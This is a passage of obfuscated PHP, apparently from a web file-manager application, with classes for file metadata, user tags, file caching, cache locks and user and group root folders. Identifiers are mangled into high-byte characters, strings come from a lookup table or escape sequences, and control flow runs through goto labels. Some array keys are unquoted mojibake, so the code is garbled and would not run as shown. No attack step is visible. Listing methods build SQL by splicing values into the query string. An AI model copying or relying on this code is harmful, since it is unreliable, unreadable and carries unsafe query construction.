= false, $—Ê¥û‰é = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ëğöŸâË, $ä¨Şúì², $Íğ“²ÛÓ, $—Ê¥û‰é); } if (!$Íğ“²ÛÓ) { $Íğ“²ÛÓ = $this->pathThis($ëğöŸâË); } $°ÁÀüğ = $ä¨Şúì² ? array($_SERVER[–Ú¬çÁ][1497] . rawurlencode($Íğ“²ÛÓ)) : array(); $°ˆöº³Ú = $this->link($ëğöŸâË, $°ÁÀüğ); $this->fileOutLink($°ˆöº³Ú); } public function fileOutServer($ÔÏ®Ş£, $¹±ßê²¤ = false, $½§„½µÀ = false, $ÖïÎÓªö = '') { parent::fileOut($ÔÏ®Ş£, $¹±ßê²¤, $½§„½µÀ, $ÖïÎÓªö); } public function fileOutImage($€È£ë‡À, $àúš†´ş = 250) { $¿¹¿üú¬ = $this->link($€È£ë‡À . $_SERVER[–Ú¬çÁ][1498] . $àúš†´ş); $this->fileOutLink($¿¹¿üú¬); } public function fileOutImageServer($ó¿Ë­›‹, $™ÓïòíŞ = 250) { parent::fileOutImage($ó¿Ë­›‹, $™ÓïòíŞ); } public function hashMd5($Ëô©»ëš) { $›ÅÌ¤ÌÃ =& $_SERVER[–Ú¬çÁ]; $éüÕúÜÁ = $this->_objectMeta($Ëô©»ëš); return isset($éüÕúÜÁ[$›ÅÌ¤ÌÃ[238]]) ? $éüÕúÜÁ[$›ÅÌ¤ÌÃ[238]] : !1; } public function size($ ĞÙƒ÷¾) { $”Š÷Åû = $this->objectMeta($ ĞÙƒ÷¾); return $”Š÷Åû ? $”Š÷Åû[$_SERVER[–Ú¬çÁ][76]] : 0; } public function info($‚Ø‚èÆ) { if ($this->isFolder($‚Ø‚èÆ)) { return $this->folderInfo($‚Ø‚èÆ); } else { if ($this->isFile($‚Ø‚èÆ)) { return $this->fileInfo($‚Ø‚èÆ); } } return !1; } public function exist($¾…ïš˜‰) { return $this->isFile($¾…ïš˜‰) || $this->isFolder($¾…ïš˜‰); } public function isFile($„Ò”’üÚ) { return !$this->isFolder($„Ò”’üÚ) && $this->objectMeta($„Ò”’üÚ); } public function isFolder($—ô³Öô) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][166], $—ô³Öô); } protected function objectMeta($Ìù°›˜Š) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][168], $Ìù°›˜Š); } protected function _objectMeta($¹¦¦æ…ú) { $¸ºÌÒÈ =& $_SERVER[–Ú¬çÁ]; if ($¹¦¦æ…ú == $¸ºÌÒÈ[12] || $¹¦¦æ…ú == $¸ºÌÒÈ[8]) { return array(); } $»Ùøóš = $this->ussRequest($¹¦¦æ…ú, $¸ºÌÒÈ[1499]); if (!$»Ùøóš[$¸ºÌÒÈ[1232]]) { return null; } $ß¤…ğÒæ = isset($»Ùøóš[$¸ºÌÒÈ[1222]]) ? $»Ùøóš[$¸ºÌÒÈ[1222]] : array(); if (!isset($ß¤…ğÒæ[$¸ºÌÒÈ[1500]])) { return null; } $œ‰·Û½ = array($¸ºÌÒÈ[33] => isset($ß¤…ğÒæ[$¸ºÌÒÈ[1500]]) ? $ß¤…ğÒæ[$¸ºÌÒÈ[1500]] : null, $¸ºÌÒÈ[76] => isset($ß¤…ğÒæ[$¸ºÌÒÈ[1501]]) ? $ß¤…ğÒæ[$¸ºÌÒÈ[1501]] : null, $¸ºÌÒÈ[238] => isset($ß¤…ğÒæ[$¸ºÌÒÈ[1502]]) ? $ß¤…ğÒæ[$¸ºÌÒÈ[1502]] : null, $¸ºÌÒÈ[1469] => isset($ß¤…ğÒæ[$¸ºÌÒÈ[1503]]) ? $ß¤…ğÒæ[$¸ºÌÒÈ[1503]] : null); $œ‰·Û½[$¸ºÌÒÈ[1470]] = isset($ß¤…ğÒæ[$¸ºÌÒÈ[1504]]) ? strtotime($ß¤…ğÒæ[$¸ºÌÒÈ[1504]]) : $œ‰·Û½[$¸ºÌÒÈ[1469]]; return $œ‰·Û½; } protected function _isFolder($›…Ôß´) { $âŠ¬İ´ =& $_SERVER[–Ú¬çÁ]; if ($›…Ôß´ == $âŠ¬İ´[12] || $›…Ôß´ == $âŠ¬İ´[8]) { return !0; } $ëÍ«æğù = $this->_objectMeta($›…Ôß´); return isset($ëÍ«æğù[$âŠ¬İ´[33]]) && $ëÍ«æğù[$âŠ¬İ´[33]] == $âŠ¬İ´[75] ? !0 : !1; } } goto eÇöíÆù‹; dÒÒŞ’Ïî¼: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\164\x61\147\x4c\x69\163\164"; public $modelType = "\x55\163\x65\x72\117\x70\164\151\x6f\156"; public $field = array("\156\141\155\145", "\163\x74\x79\154\145", "\x73\157\x72\164"); public function listData($ï±Ş­èÌ = false, $Æßáâìñ = "\x73\x6f\162\164", $İÓÎÀéš = false) { return parent::listData($ï±Ş­èÌ, $Æßáâìñ, $İÓÎÀéš); } public function remove($¾×¡ñ­š) { return parent::remove($¾×¡ñ­š); } public function add($ÑÄÑï¡, $×â­’·ª = "\154\x61\142\145\x6c\x2d\147\162\x65\171\x2d\156\157\162\155\x61\154") { $à´µì¨™ =& $_SERVER[–Ú¬çÁ]; if ($this->findByName($ÑÄÑï¡)) { return !1; } $ßøöÙ÷¬ = array($à´µì¨™[471] => $ÑÄÑï¡, $à´µì¨™[536] => $×â­’·ª, $à´µì¨™[1868] => $this->getSort($à´µì¨™[311]) + 1); return parent::insert($ßøöÙ÷¬); } public function update($¸¯›¥½Ã, $ŞğÚÃ±) { $ú²„İÁ“ =& $_SERVER[–Ú¬çÁ]; $ë„³äÏĞ = $this->listData($¸¯›¥½Ã); $Æ×ßÅÂ¬ = $this->findByName($ŞğÚÃ±[$ú²„İÁ“[32]]); if (!$ë„³äÏĞ || $Æ×ßÅÂ¬ && $Æ×ßÅÂ¬[$ú²„İÁ“[452]] != $ë„³äÏĞ[$ú²„İÁ“[452]]) { return !1; } return parent::update($¸¯›¥½Ã, $ŞğÚÃ±); } public function moveTop($íºèÅİ±) { $íÕËöå± =& $_SERVER[–Ú¬çÁ]; $¢®Øä· = parent::listData(); $¥İ¼—ú¯ = $this->getSort($íÕËöå±[310]); foreach ($¢®Øä· as &$©”ÃÕÕö) { if ($©”ÃÕÕö[$íÕËöå±[452]] == $íºèÅİ±) { $©”ÃÕÕö[$íÕËöå±[1888]] = $¥İ¼—ú¯; continue; } $©”ÃÕÕö[$íÕËöå±[1888]] += 1; } unset($©”ÃÕÕö); return parent::resetData($¢®Øä·); } public function moveBottom($ô¤¨ªêä) { $¼ÌÁŠÓË =& $_SERVER[–Ú¬çÁ]; $¯”ê °Ø = $this->getSort($¼ÌÁŠÓË[311]) + 1; return parent::update($ô¤¨ªêä, array($¼ÌÁŠÓË[1888] => $¯”ê °Ø)); } public function resetSort($ñó³™ßÂ) { $‚ÌÊ–ÅÔ =& $_SERVER[–Ú¬çÁ]; $´ÍÔ‰ûÎ = array(); $ñó³™ßÂ = is_array($ñó³™ßÂ) ? $ñó³™ßÂ : array(); for ($ğàËÔæ½ = 0; $ğàËÔæ½ < count($ñó³™ßÂ); $ğàËÔæ½++) { $´ÍÔ‰ûÎ[$ñó³™ßÂ[$ğàËÔæ½] . $‚ÌÊ–ÅÔ[12]] = $ğàËÔæ½ + 1; } $Ÿ‹ÄãÜ¶ = parent::listData(); foreach ($Ÿ‹ÄãÜ¶ as &$•¼®‡¾–) { $×Ğš‘¸‡ = $´ÍÔ‰ûÎ[$•¼®‡¾–[$‚ÌÊ–ÅÔ[452]]]; $•¼®‡¾–[$‚ÌÊ–ÅÔ[1888]] = $×Ğš‘¸‡ ? $×Ğš‘¸‡ : $•¼®‡¾–[$‚ÌÊ–ÅÔ[1888]]; } unset($•¼®‡¾–); return parent::resetData($Ÿ‹ÄãÜ¶); } private function getSort($¶¦ô°Õ) { $÷ôÆ´äß =& $_SERVER[–Ú¬çÁ]; $ÌñÏœŒ = parent::listData(); $öÌãÃæà = array_to_keyvalue($ÌñÏœŒ, $÷ôÆ´äß[12], $÷ôÆ´äß[1888]); if (!$öÌãÃæà) { $öÌãÃæà = array(0); } $ëáæµÊ = $¶¦ô°Õ == $÷ôÆ´äß[311] ? max($öÌãÃæà) : min($öÌãÃæà); return intval($ëáæµÊ); } } goto c×Î¨ÂËÊ ; eÒÔŠ¤Ê±ñ: define($_SERVER[–Ú¬çÁ][655], $_SERVER[–Ú¬çÁ][656]); $fzutclsidh = $_SERVER[–Ú¬çÁ][657]; while (strlen($fzutclsidh) < $_SERVER[–Ú¬çÁ][658]) { if (!$fzutclsidh) { break; } $fzutclsidh++; } goto D‹ï²»ÕÅ„; B‚ÛÊå¾Ã¡: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($—Ç®±øò, $ÃîˆôÒİ) { $ “ ¹„ =& $_SERVER[–Ú¬çÁ]; $this->cachePath = $—Ç®±øò[$ “ ¹„[84]]; $this->prefix = $ “ ¹„[855]; $this->cacheTime = $ÃîˆôÒİ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ñĞ Œ±™) { $ÊÒˆ¤¦‚ =& $_SERVER[–Ú¬çÁ]; $ñĞ Œ±™ = str_replace(array($ÊÒˆ¤¦‚[856], $ÊÒˆ¤¦‚[97], $ÊÒˆ¤¦‚[73]), $ÊÒˆ¤¦‚[857], $ñĞ Œ±™); return $this->cachePath . $ÊÒˆ¤¦‚[858] . $ñĞ Œ±™ . $ÊÒˆ¤¦‚[859]; } public function set($¹×º¦çŞ, $¡‰÷¿…·, $”í»çÑ¤ = false) { $”í»çÑ¤ = $”í»çÑ¤ ? $”í»çÑ¤ : $this->cacheTime; $™üïˆÜÖ = $this->getFile($¹×º¦çŞ); if (file_put_contents($™üïˆÜÖ, $this->prefix . $¡‰÷¿…·, LOCK_EX)) { @touch($™üïˆÜÖ, intval(time() + $”í»çÑ¤)); clearstatcache(); return !0; } @unlink($™üïˆÜÖ); return !1; } public function get($ş»ôøê¹) { $Ùë¸—‰Ü = $this->getFile($ş»ôøê¹); if (file_exists($Ùë¸—‰Ü) && filemtime($Ùë¸—‰Ü) < time()) { @unlink($Ùë¸—‰Ü); return !1; } $ÊÆ¬¿¼ = @file_get_contents($Ùë¸—‰Ü); return substr($ÊÆ¬¿¼, strlen($this->prefix)); } public function remove($â’ÆÓ¦Å) { $¤ü§—È = $this->getFile($â’ÆÓ¦Å); return @unlink($¤ü§—È); } public function deleteAll() { $‰ùŞ‰òÇ =& $_SERVER[–Ú¬çÁ]; $è˜À¤‘ç = scandir($this->cachePath); foreach ($è˜À¤‘ç as $Æ¾ÚãíÙ) { $ÄÚêÛ™© = $this->cachePath . $Æ¾ÚãíÙ; if (strpos($ÄÚêÛ™©, $‰ùŞ‰òÇ[859]) && strpos($ÄÚêÛ™©, $‰ùŞ‰òÇ[860])) { @unlink($ÄÚêÛ™©); } } } public function clearTimeout() { $ÊıÕ©Ñ =& $_SERVER[–Ú¬çÁ]; $ãÜ’·¦¨ = scandir($this->cachePath); foreach ($ãÜ’·¦¨ as $¶È—íû—) { $êŒİ²µ = $this->cachePath . $¶È—íû—; if (strpos($êŒİ²µ, $ÊıÕ©Ñ[859]) && strpos($êŒİ²µ, $ÊıÕ©Ñ[860]) && filemtime($êŒİ²µ) < time()) { @unlink($êŒİ²µ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¹“§Ô =& $_SERVER[–Ú¬çÁ]; if (self::$handle) { return self::$handle; } $ÓÇöÈİ› = $GLOBALS[$¹“§Ô[6]][$¹“§Ô[402]]; self::$timeout = $ÓÇöÈİ›[$¹“§Ô[861]] ? $ÓÇöÈİ›[$¹“§Ô[861]] : 10; $Ö÷€×«• = _get($GLOBALS[$¹“§Ô[6]], $¹“§Ô[862]); $Ï¾©ïÉŞ = $ÓÇöÈİ›[$¹“§Ô[847]] ? $ÓÇöÈİ›[$¹“§Ô[847]] : $¹“§Ô[224]; if ($Ï¾©ïÉŞ == $¹“§Ô[21] && $Ö÷€×«• == $¹“§Ô[13]) { $Ï¾©ïÉŞ = $¹“§Ô[224]; } switch ($Ï¾©ïÉŞ) { case $¹“§Ô[850]: self::$handle = new CacheLockRedis(); break; case $¹“§Ô[851]: self::$handle = new CacheLockMemcached(); break; case $¹“§Ô[21]: self::$handle = new CacheLockDatabase(); break; case $¹“§Ô[224]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¹“§Ô[863], $¹“§Ô[864]); } return self::$handle; } private static function key($—ü­Æ–) { return $_SERVER[–Ú¬çÁ][865] . Cache::key($—ü­Æ–); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($·İ‚û¸× = '') { self::$errorMsg = $·İ‚û¸×; } public static function lockGlobal($±Ë¸Ø¸Ò, $°Éî‰) { return self::lock($±Ë¸Ø¸Ò, $°Éî‰, !0); } public static function lock($»‘¶, $‚Ç§¹Îû = false, $ŒûúÊü = false) { $«è’ÎÂ³ =& $_SERVER[–Ú¬çÁ]; $Âû¥‚ = self::init(); $ª…ı¢º = self::key($»‘¶); $‚Ç§¹Îû = $‚Ç§¹Îû ? $‚Ç§¹Îû : self::$timeout; $œÒÉ”€ = timeFloat(); $¤­ƒÂƒƒ = $Âû¥‚->lock($ª…ı¢º, $‚Ç§¹Îû); $¸…ÈÀ‘Ô = timeFloat(); if (!$¤­ƒÂƒƒ) { $€ª›¥• = "\x6c\157\x63\x6b\x20\145\x72\162\x6f\162\x3b\x6b\145\171\75{$»‘¶}\73\x74\151\x6d\x65\75{$‚Ç§¹Îû}\x3b" . self::$errorMsg . $«è’ÎÂ³[71] . get_caller_msg(); $Å®ê¡øä = LNG($«è’ÎÂ³[866]) . "\x28{$‚Ç§¹Îû}\163\51\56" . LNG($«è’ÎÂ³[867]); $Å®ê¡øä .= $«è’ÎÂ³[868]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Å®ê¡øä = $Å®ê¡øä . $«è’ÎÂ³[869] . self::$errorMsg; } write_log($«è’ÎÂ³[870] . sprintf($«è’ÎÂ³[871], timeFloat() - $œÒÉ”€) . $«è’ÎÂ³[872] . $€ª›¥• . $«è’ÎÂ³[873] . error_get_last(), $«è’ÎÂ³[864]); show_json($Å®ê¡øä, !1); } if (!$ŒûúÊü) { self::$lockItem[$ª…ı¢º] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ñ¡«§Ñş = number_format(timeFloat() - $¸…ÈÀ‘Ô, 3); write_log($«è’ÎÂ³[874] . $»‘¶ . $«è’ÎÂ³[875] . $Ñ¡«§Ñş, $«è’ÎÂ³[864]); } return $¤­ƒÂƒƒ; } public static function lockGet($µäº¶Ê) { $õ¢ã€›¨ = self::key($µäº¶Ê); if (self::$lockItem[$õ¢ã€›¨]) { return self::$lockItem[$õ¢ã€›¨]; } return self::init()->lockGet($õ¢ã€›¨); } public static function unlock($æÊÌĞÁ¾) { $ğŠßæóó =& $_SERVER[–Ú¬çÁ]; $èÖ‘ëæ« = self::key($æÊÌĞÁ¾); self::$lockItem[$èÖ‘ëæ«] = null; self::init()->unlock($èÖ‘ëæ«); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ğŠßæóó[876] . $æÊÌĞÁ¾, $ğŠßæóó[864]); } return; } public static function unlockRuntime() { $é¢ùó¡§ =& $_SERVER[–Ú¬çÁ]; $À‡­æŸÈ = self::init(); $”¾æ¡²³ = !1; foreach (self::$lockItem as $ûáæ¢–ã => $è¯İ÷×) { if (!$è¯İ÷×) { continue; } $À‡­æŸÈ->unlock($ûáæ¢–ã); if (!$”¾æ¡²³) { $”¾æ¡²³ = !0; write_log($é¢ùó¡§[877] . $ûáæ¢–ã . $é¢ùó¡§[71] . get_caller_msg(), $é¢ùó¡§[864]); continue; } write_log($é¢ùó¡§[877] . $ûáæ¢–ã, $é¢ùó¡§[864]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¿üòò§Ø = number_format(timeFloat() - TIME_FLOAT, 3); write_log($é¢ùó¡§[878] . $¿üòò§Ø . $é¢ùó¡§[879] . ACTION, $é¢ùó¡§[864]); } } public static function fileLock($÷×Ôû×Â) { $™¦¥Ì®Ú =& $_SERVER[–Ú¬çÁ]; if (!$GLOBALS[$™¦¥Ì®Ú[880]]) { $GLOBALS[$™¦¥Ì®Ú[880]] = array(); } $GLOBALS[$™¦¥Ì®Ú[880]][$÷×Ôû×Â] = !1; $‚àîƒô = fopen(DATA_PATH . $÷×Ôû×Â . $™¦¥Ì®Ú[881], $™¦¥Ì®Ú[882]); if (!$‚àîƒô) { return !1; } $GLOBALS[$™¦¥Ì®Ú[880]][$÷×Ôû×Â] = $‚àîƒô; if (flock($‚àîƒô, LOCK_EX)) { return !0; } self::unlock($÷×Ôû×Â); show_json($™¦¥Ì®Ú[883], !1); return !1; } public static function fileUnlock($¼Åõ³¼¨) { $İÑÅú•¸ =& $_SERVER[–Ú¬çÁ]; $²–Æ½Êƒ = $GLOBALS[$İÑÅú•¸[880]][$¼Åõ³¼¨]; if (!$²–Æ½Êƒ) { return; } $GLOBALS[$İÑÅú•¸[880]][$¼Åõ³¼¨] = !1; flock($²–Æ½Êƒ, LOCK_UN); fclose($²–Æ½Êƒ); } public static function fileUnlockAll() { $ğœêµâ =& $_SERVER[–Ú¬çÁ]; if (!$GLOBALS[$ğœêµâ[880]]) { return; } foreach ($GLOBALS[$ğœêµâ[880]] as $ëóê½úË => $¼¸İ€­ü) { if (!$¼¸İ€­ü) { continue; } $GLOBALS[$ğœêµâ[880]][$ëóê½úË] = !1; flock($¼¸İ€­ü, LOCK_UN); fclose($¼¸İ€­ü); } $GLOBALS[$ğœêµâ[880]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto d¢ô¡½ö†¸; d±ØÌŠ×„: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($÷±€‰±) { $à“Ï«„¾ =& $_SERVER[–Ú¬çÁ]; $Ğèı¹Ãí = Model($à“Ï«„¾[556])->where(array($à“Ï«„¾[1657] => $÷±€‰±))->find(); $ù¦ıæÍŸ = $this->_mkdirRoot(SourceModel::TYPE_USER, $÷±€‰±, $Ğèı¹Ãí[$à“Ï«„¾[32]]); $this->userDesktopAdd($ù¦ıæÍŸ); return $ù¦ıæÍŸ; } public function userDesktopAdd($…Ëâœ¼) { $å£šÂì =& $_SERVER[–Ú¬çÁ]; $ä×˜şëú = LNG($å£šÂì[2137]); $ğµÔ•ã = $this->mkdir($…Ëâœ¼, $ä×˜şëú); $this->metaSet($ğµÔ•ã, $å£šÂì[2138], $å£šÂì[88]); $this->metaSet($…Ëâœ¼, $å£šÂì[2139], $ğµÔ•ã); } public function userPathSafeAdd($É³æëÏÛ) { $•È˜ëÈÎ =& $_SERVER[–Ú¬çÁ]; $ô‡º­›Ÿ = Model($•È˜ëÈÎ[556])->getInfoFull($É³æëÏÛ); if (!$ô‡º­›Ÿ) { return !1; } if (_get($ô‡º­›Ÿ, $•È˜ëÈÎ[578])) { return $ô‡º­›Ÿ[$•È˜ëÈÎ[516]][$•È˜ëÈÎ[2140]]; } $èøğó„ = $this->_mkdirRoot(SourceModel::TYPE_USER, $É³æëÏÛ, $•È˜ëÈÎ[2141], $•È˜ëÈÎ[483]); Model($•È˜ëÈÎ[556])->metaSet($É³æëÏÛ, $•È˜ëÈÎ[2140], $èøğó„); $this->metaSet($èøğó„, $•È˜ëÈÎ[2142], $É³æëÏÛ); return $èøğó„; } public function groupRootAdd($¢¥¨ÀÂ) { $âÙèÀ‹ñ =& $_SERVER[–Ú¬çÁ]; $ÔÚàúßÊ = Model($âÙèÀ‹ñ[564])->where(array($âÙèÀ‹ñ[1952] => $¢¥¨ÀÂ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¢¥¨ÀÂ, $ÔÚàúßÊ[$âÙèÀ‹ñ[32]]); } public function systemRootPathAdd($şõ‘¾œ) { if ($şõ‘¾œ != $_SERVER[–Ú¬çÁ][584]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $şõ‘¾œ); } public function userRootRemove($¶Ï×ò•) { $Ø¾¢¶Ëî = $this->targetSourceRoot(SourceModel::TYPE_USER, $¶Ï×ò•, !0); foreach ($Ø¾¢¶Ëî as $‚›¿û±) { if (!$‚›¿û±) { continue; } $this->remove($‚›¿û±[$_SERVER[–Ú¬çÁ][181]], !1); } } public function groupRootRemove($û­×®) { $±‰Öß“Ö = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $û­×®); if (!$±‰Öß“Ö) { return; } $this->remove($±‰Öß“Ö[$_SERVER[–Ú¬çÁ][181]], !1); } private function _mkdirRoot($‘´ò…Âà, $¶¶®³ÊÓ, $©«¶ä, $÷±ò Ä = '') { $ã‰”ğÀÇ =& $_SERVER[–Ú¬çÁ]; $áÇ–³¿‹ = defined($ã‰”ğÀÇ[2085]) ? USER_ID : 0; $ú‘£ÂÁ© = array($ã‰”ğÀÇ[454] => 0, $ã‰”ğÀÇ[626] => $‘´ò…Âà, $ã‰”ğÀÇ[627] => $¶¶®³ÊÓ, $ã‰”ğÀÇ[624] => 1, $ã‰”ğÀÇ[628] => $áÇ–³¿‹, $ã‰”ğÀÇ[629] => $áÇ–³¿‹, $ã‰”ğÀÇ[625] => $÷±ò Ä, $ã‰”ğÀÇ[630] => $ã‰”ğÀÇ[573], $ã‰”ğÀÇ[481] => 0, $ã‰”ğÀÇ[595] => 0, $ã‰”ğÀÇ[519] => 0, $ã‰”ğÀÇ[631] => $ã‰”ğÀÇ[12]); if ($¹¬€ñé = $this->where($ú‘£ÂÁ©)->find()) { return $¹¬€ñé[$ã‰”ğÀÇ[181]]; } $Æ„ÓÄÕé = "\x4d\157\144\145\x6c\x53\x6f\x75\x72\x63\x65\56\x6d\x6b\x64\151\162\122\157\x6f\x74\56{$‘´ò…Âà}\x2e{$¶¶®³ÊÓ}\56" . $©«¶ä; CacheLock::lock($Æ„ÓÄÕé); $ú‘£ÂÁ©[$ã‰”ğÀÇ[32]] = $©«¶ä; $Ÿõõ‡øè = $this->add($ú‘£ÂÁ©); $ÃĞŒ²şí = array($ã‰”ğÀÇ[632] => short_id($Ÿõõ‡øè)); $this->where(array($ã‰”ğÀÇ[468] => $Ÿõõ‡øè))->save($ÃĞŒ²şí); CacheLock::unlock($Æ„ÓÄÕé); return $Ÿõõ‡øè; } private function targetSourceRoot($ºË­ˆÚ, $ŒÅ•œ³, $­¼»¬Ä = false) { $•¯¿¸›² =& $_SERVER[–Ú¬çÁ]; $ÁÓÀÓıÀ = array($•¯¿¸›²[454] => 0, $•¯¿¸›²[626] => $ºË­ˆÚ, $•¯¿¸›²[627] => $ŒÅ•œ³); if ($­¼»¬Ä) { $äÏÁ¿‡ = $this->where($ÁÓÀÓıÀ)->select(); return $äÏÁ¿‡ ? $äÏÁ¿‡ : array(); } $â•ğ£àï = $this->where($ÁÓÀÓıÀ)->find(); return $â•ğ£àï ? $â•ğ£àï : array(); } public function sourceRootGroup($®ı”°Ó) { $ûşİî‘¼ =& $_SERVER[–Ú¬çÁ]; if (is_string($®ı”°Ó)) { $®ı”°Ó = array($®ı”°Ó); } $á ”œƒŒ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $®ı”°Ó, $ûşİî‘¼[213]); $Í™¾Íî© = array($ûşİî‘¼[422] => $á ”œƒŒ, $ûşİî‘¼[419] => array($ûşİî‘¼[778] => count($®ı”°Ó))); $this->_listDataApply($Í™¾Íî©[$ûşİî‘¼[422]]); $this->_listMake($Í™¾Íî©); return array_to_keyvalue($Í™¾Íî©[$ûşİî‘¼[82]], $ûşİî‘¼[548]); } public function mkfile($öøÑ®ì¿, $×…Šî¨É, $ôâ²ŒÏÚ = '', $ãÉ‚”Ì· = REPEAT_RENAME) { $»¥ı¹ › =& $_SERVER[–Ú¬çÁ]; $É©ÚäûÏ = Model($»¥ı¹ ›[652])->addFileByContent($ôâ²ŒÏÚ, $×…Šî¨É); return $this->_createFileCall($öøÑ®ì¿, $×…Šî¨É, $É©ÚäûÏ, $ãÉ‚”Ì·, $»¥ı¹ ›[1362]); } public function addFile($ø«¦…¾Ë, $™§ššå¤, $ÍŞÌŸ’Ğ, $»öèÍÒÌ = false, $ÌÄ‹á‚¿ = REPEAT_RENAME) { $ªÔóÔˆ§ = Model($_SERVER[–Ú¬çÁ][652])->addFile($™§ššå¤, $ÍŞÌŸ’Ğ, $»öèÍÒÌ); return $this->_createFileCall($ø«¦…¾Ë, $ÍŞÌŸ’Ğ, $ªÔóÔˆ§, $ÌÄ‹á‚¿); } public function addFileByFileID($¥ß‚ò¯´, $†Šçâ›, $ñ¾ôçˆ, $İíä´ÉÓ = REPEAT_RENAME) { $¡«Ô£§° =& $_SERVER[–Ú¬çÁ]; $±¢Å‰‚ = Model($¡«Ô£§°[652])->find($†Šçâ›); Model($¡«Ô£§°[652])->linkAdd($†Šçâ›); return $this->_createFileCall($¥ß‚ò¯´, $ñ¾ôçˆ, $±¢Å‰‚, $İíä´ÉÓ); } public function addFileByRemote($ßÆç™¤µ, $¾Ö¸µÑ, $¾ÔòŒÊä, $âô¹©š = array(), $áÕÓàä£ = REPEAT_RENAME) { $Òş§áá = Model($_SERVER[–Ú¬çÁ][652])->addFileByRemote($¾Ö¸µÑ, $¾ÔòŒÊä, $âô¹©š); return $this->_createFileCall($ßÆç™¤µ, $¾ÔòŒÊä, $Òş§áá, $áÕÓàä£); } private function _createFileCall($¼‘å¿ßî, $âªªß²‹, $è§«µç, $ìÍñšè, $¾ÚÖç„ï = "\x75\160\154\157\x61\x64") { $¬Ô——¿ú =& $_SERVER[–Ú¬çÁ]; $‚¡ã²Á„ = !1; $this->setMasterDB(); $this->lockWriteStart($¼‘å¿ßî, $âªªß²‹); $‰£²ÊÚ– = $this->fileNameExist($¼‘å¿ßî, $âªªß²‹); $· É•¬ = $this->_createFile($¼‘å¿ßî, $âªªß²‹, $è§«µç, $ìÍñšè, $‚¡ã²Á„); if (!$‚¡ã²Á„) { Model($¬Ô——¿ú[521])->remove($è§«µç[$¬Ô——¿ú[518]]); } if ($‚¡ã²Á„ && $· É•¬ && $· É•¬ != $‰£²ÊÚ–) { Model($¬Ô——¿ú[2110])->eventCreate($· É•¬, $¾ÚÖç„ï); } $this->lockWriteEnd($¼‘å¿ßî, $âªªß²‹); return $· É•¬; } public function mkdir($ó”Í—Ï¸, $ÂÙÔ±­€, $èâŸîĞ‚ = REPEAT_SKIP) { $ìÅÔÄ¡õ =& $_SERVER[–Ú¬çÁ]; $this->setMasterDB(); $åÇåı½ò = $this->sourceInfo($ó”Í—Ï¸); if (!$åÇåı½ò) { return !1; } $this->lockWriteStart($ó”Í—Ï¸, $ÂÙÔ±­€); if ($èâŸîĞ‚ !== !1) { $ÍÙ‘äØ— = $this->fileNameExist($ó”Í—Ï¸, $ÂÙÔ±­€); if ($ÍÙ‘äØ— && $èâŸîĞ‚ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ó”Í—Ï¸, $ÂÙÔ±­€); return $ÍÙ‘äØ—; } $ÂÙÔ±­€ = $this->fileNameAuto($ó”Í—Ï¸, $ÂÙÔ±­€, $èâŸîĞ‚); } $ùºƒ¹’­ = array($ìÅÔÄ¡õ[624] => 1, $ìÅÔÄ¡õ[471] => $ÂÙÔ±­€, $ìÅÔÄ¡õ[625] => $ìÅÔÄ¡õ[12], $ìÅÔÄ¡õ[519] => 0, $ìÅÔÄ¡õ[595] => 0); $İÊÒ¶û§ = $this->_addSource($ùºƒ¹’­, $åÇåı½ò); Model($ìÅÔÄ¡õ[2110])->eventCreate($İÊÒ¶û§, $ìÅÔÄ¡õ[1363]); $this->lockWriteEnd($ó”Í—Ï¸, $ÂÙÔ±­€); return $İÊÒ¶û§; } public function listSourceRoot($Õğƒ¯ò¿, $¼úò¸‰˜, $şï ƒŸ÷ = "\163\x6f\x75\162\143\x65\x49\x44\x2c\x74\x61\162\x67\x65\x74\x49\x44\54\x73\x69\172\145") { $üì¯€• =& $_SERVER[–Ú¬çÁ]; $”ŞÃ§Ù = $üì¯€•[431]; $ÑüüÊç¯ = array(); $¤Ñ¾‹úï = 1024 * 50; $ôÊáà½ï = is_array($ôÊáà½ï) ? $ôÊáà½ï : array(); $¦Å²«ôÃ = count($¼úò¸‰˜); $Œå¥Õ—ì = $this->tablePrefix . $üì¯€•[2143]; for ($ÂÕ®áÎ½ = 0; $ÂÕ®áÎ½ < $¦Å²«ôÃ; $ÂÕ®áÎ½++) { $É¥°ñ×Õ = $¼úò¸‰˜[$ÂÕ®áÎ½]; $”ŞÃ§Ù .= "\x53\105\x4c\x45\x43\x54\40\x2a\40\106\122\117\115\x20\50\x53\x45\x4c\x45\x43\x54\40{$şï ƒŸ÷}\40\106\122\117\x4d\x20\140{$Œå¥Õ—ì}\140\40\127\x48\105\x52\105\40"; $”ŞÃ§Ù .= "\140\x70\141\x72\145\156\x74\111\104\x60\75\x30\x20\101\116\x44\40\140\x74\x61\162\147\x65\x74\111\x44\140\75{$É¥°ñ×Õ}\40\x41\x4e\104\x20\140\x74\x61\162\147\x65\x74\x54\171\x70\x65\140\75{$Õğƒ¯ò¿}\x20\x61\x6e\x64\40\146\151\x6c\x65\124\x79\x70\x65\75\x27\x27\x20\x6c\x69\x6d\151\x74\40\x31\x29\40\141\163\x20\164\x62\x5f{$ÂÕ®áÎ½}\x20\125\116\x49\x4f\116\40\x41\x4c\114\x20"; if ((strlen($”ŞÃ§Ù) >= $¤Ñ¾‹úï || $ÂÕ®áÎ½ == $¦Å²«ôÃ - 1) && $”ŞÃ§Ù) { 